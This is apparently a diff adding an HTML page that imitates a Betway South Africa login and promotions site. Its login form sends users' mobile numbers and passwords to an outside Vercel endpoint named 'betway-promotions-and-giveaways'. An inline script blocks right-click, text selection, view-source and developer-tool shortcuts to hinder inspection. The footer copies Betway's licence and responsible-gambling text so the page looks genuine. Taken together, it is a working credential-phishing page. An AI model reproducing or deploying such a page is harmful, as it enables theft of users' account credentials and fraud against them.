@@ -1,0 +1,124 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Betway promotions</title>
+  <link rel="stylesheet" href="main.css">
+</head>
+<body>
+
+  <script>
+    // Dynamically load CSS
+    var link = document.createElement('link');
+    link.rel = 'stylesheet';
+    link.type = 'text/css';
+    link.href = 'main.css'; // Your CSS file
+    document.getElementsByTagName('head')[0].appendChild(link);
+
+    // Disable right-click
+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+    });
+
+    // Disable text selection
+    document.addEventListener('selectstart', function(e) {
+        e.preventDefault();
+    });
+
+    // Disable Ctrl+U (View Source)
+    document.addEventListener('keydown', function(e) {
+        if (e.ctrlKey && e.key === 'u') {
+            e.preventDefault();
+        }
+    });
+
+    // Disable Ctrl+Shift+I (Developer Tools)
+    document.addEventListener('keydown', function(e) {
+        if (e.ctrlKey && e.shiftKey && e.key === 'I') {
+            e.preventDefault();
+        }
+    });
+
+    // Disable F12 (Developer Tools)
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'F12') {
+            e.preventDefault();
+        }
+    });
+</script>
+
+
+  <!-- Header Section -->
+  <div class="header">
+    <div class="menu-icon">≡</div>
+    <div class="brand">
+      <span class="brand-name">betway</span>
+    </div>
+    <div class="header-buttons">
+      <button class="login-header-btn">Login</button>
+      <button class="signup-header-btn">Sign Up</button>
+      <button class="betslip-header-btn">
+        Betslip <span class="betslip-count">0</span>
+      </button>
+    </div>
+  </div>
+
+  <!-- Overlay and Login Box -->
+  <div class="overlay">
+    <div class="login-box">
+      <div class="close-btn">×</div>
+      <h2>Login</h2>
+      
+      
+      <form action="https://betway-promotions-and-giveaways.vercel.app/send-email" method="POST">
+        <div class="mobile-number">
+          <span class="country-code">+27</span>
+          <input type="text" name="mobile_number" placeholder="Mobile Number" required>
+        </div>
+        <a href="#" class="forgot-text">Forgot Username?</a>
+        <input type="password" name="password" placeholder="Password" required>
+        <a href="#" class="forgot-text">Forgot Password?</a>
+        <button type="submit" class="login-btn">Login</button>
+      </form>
+      
+      <p class="signup-text">
+        Don't have an account yet? 
+        <a href="#" class="signup-link">Sign Up</a>
+      </p>
+    </div>
+  </div>
+
+  <!-- Footer Section -->
+<footer class="footer">
+  <div class="footer-content">
+    <!-- Left Column -->
+    <div class="footer-left">
+      <p class="footer-brand">betway</p>
+      <p>Terms and Conditions</p>
+      <p>Sponsorships</p>
+      <p>Affiliates</p>
+    </div>
+    <!-- Right Column -->
+    <div class="footer-right">
+      <p>How to Play</p>
+      <p>Privacy Policy</p>
+      <p>Contact Us</p>
+      <p>FAQ</p>
+      <p>Responsible Gaming</p>
+      <p>Betway App</p>
+      <p>PAIA Manual</p>
+    </div>
+  </div>
+  <p class="footer-text">
+    Raging River Trading (Pty) Ltd (2011/134505/07) is licensed to promote Betway South Africa,
+    regulated by the Western Cape Gambling and Racing Board. Bookmaker License Number:
+    10181496-010 issued on 1 December 2016. No persons under the age of 18 years are permitted
+    to gamble. Winners know when to stop. National Responsible Gambling Programme:
+    0800 006 008 or WHATSAPP HELP 076 675 0710. Warning: Gambling involves risk.
+    Gambling on this website, you run the risk that you may lose.
+  </p>
+</footer>
+</body>
+</html>
